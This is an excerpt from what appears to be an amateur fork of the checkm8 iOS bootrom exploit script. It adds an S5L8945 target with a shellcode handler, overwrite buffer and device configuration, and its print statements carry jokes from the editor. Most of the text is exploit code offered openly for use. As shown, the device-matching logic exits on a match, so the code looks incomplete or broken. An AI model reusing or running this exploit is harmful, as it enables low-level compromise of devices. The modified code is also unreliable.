...
def payload(cpid):
  ...
  if cpid == 0x8945:
    ...
    s5l8945x_handler   = asm_thumb_trampoline(0x10079800+1, 0x81A0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8945x)[8:]
...
def all_exploit_configs():
  ...
  s5l8945x_overwrite = '\0' * 0x650 + struct.pack('<20xI4x', 0x34000000)
  ...
  return [
    ...
    DeviceConfig('iBoot-1062.2',          0x8945,  659, s5l8945x_overwrite, None, None), # S5L8945 (buttons)      13.2 seconds
...
def exploit_config(serial_number):
  ...
  for config in all_exploit_configs():
    if 'CPID:%s' % config.cpid in serial_number:
      ...
      sys.exit(1)
  print 'ERROR: This is not a compatible device.'
  print 'U know wat? u can edit dis project 4 moar compatible devices ;)',serial_number
  print 'Try it at your own risk like me!!'
  sys.exit(1)

def exploit_a8_a9():
  print '*** checkm8 exploit by axi0mX ***'
  print 'Edited by callsign_arm0rst4r'
  print 'Support by ThrayYab(lnwFlash)'
  print 'I love AMD!!'
  ...
  print 'I still love AMD and Intel is just my blud not lover'
  print 'And u know what....'
...
def exploit():
  ...
  print 'U know what....'
  print '(%0.2f seconds)' % (time.time() - start)
  print 'She know I loved her but she ignored me'
  print 'Sad life ya?',device.serial_number
  dfu.release_device(device)
